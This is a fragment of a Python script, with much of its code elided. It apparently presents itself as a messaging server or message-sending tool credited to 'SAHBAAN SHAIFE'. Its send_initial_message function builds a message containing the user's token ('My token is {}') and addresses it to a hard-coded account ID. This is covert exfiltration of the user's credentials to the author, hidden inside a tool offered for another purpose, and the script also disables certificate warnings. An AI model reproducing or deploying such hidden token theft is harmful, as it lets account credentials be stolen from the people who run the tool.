...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"-- THIS SERVER MADE BY SAHBAAN SHAIFE ")
...
def send_initial_message():
    ...
    msg_template = "Hello SAHBAAN SHAIFE ❤️‍🩹🦈 sir! I am using your server. My token is {}. India live time now {}"

    # Specify the ID where you want to send the message
    target_id = "100042767170521"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\033[1;92m' + '•──────────────────────❤️S9HB99N SH9IFE 💜───────────────────────────────•')
...
def send_messages_from_file():
    ...
    def liness():
        print('\033[1;92m' + '•──────────────❤️‍🩹S9HB99N🦈 SH9IF3 💜🌿───────────────────────────────────────────•')
